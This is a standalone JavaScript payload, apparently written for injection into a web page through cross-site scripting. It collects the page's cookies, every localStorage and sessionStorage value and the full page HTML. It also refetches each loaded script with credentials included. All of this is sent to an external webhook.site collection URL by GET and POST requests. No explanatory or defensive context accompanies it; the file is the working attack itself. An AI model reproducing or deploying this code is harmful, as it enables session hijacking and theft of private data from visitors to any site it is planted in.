
url = 'https://webhook.site/v2223';

function getAllLocalStorageValues() {
  const allSessionData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    allSessionData[key] = value;
  }
  return allSessionData;
}

function getAllSessionStorageValues() {
  const allSessionData = {};
  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    const value = sessionStorage.getItem(key);
    allSessionData[key] = value;
  }
  return allSessionData;
}

const sessionData = JSON.stringify(getAllSessionStorageValues());
const localData = JSON.stringify(getAllLocalStorageValues());

inner = document.documentElement.innerHTML;
outer = document.documentElement.outerHTML;



async function getData(n) {
  try {
    const response = await fetch(n,{credentials: 'include'});

    if (!response.ok) {
    }

    const data = await response.text();

    fetch(url, {
      method: 'POST',
      body: data
     }).then(response => {});

  } catch (error) {
  }

  try {
    const response = await fetch(n);

    if (!response.ok) {
    }

    const data = await response.text();

    fetch(url, {
      method: 'POST',
      body: data
     }).then(response => {});

  } catch (error) {
  }
}

var entries = performance.getEntriesByType('resource');
entries.map(function(entry) {
  if (entry.initiatorType === 'script') {
    getData(entry.name)
  }
});


(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", url + "/?cookie="+document.cookie+"&ls"+localData+"&ss="+sessionData, true);
      xhr.onload = function(e) {
      };
      xhr.onerror = function () {
      };
      xhr.send();
   })
})()

fetch(url, {
  method: 'POST',
  body: inner // Convert the JavaScript object to a JSON string
}).then(response => {});
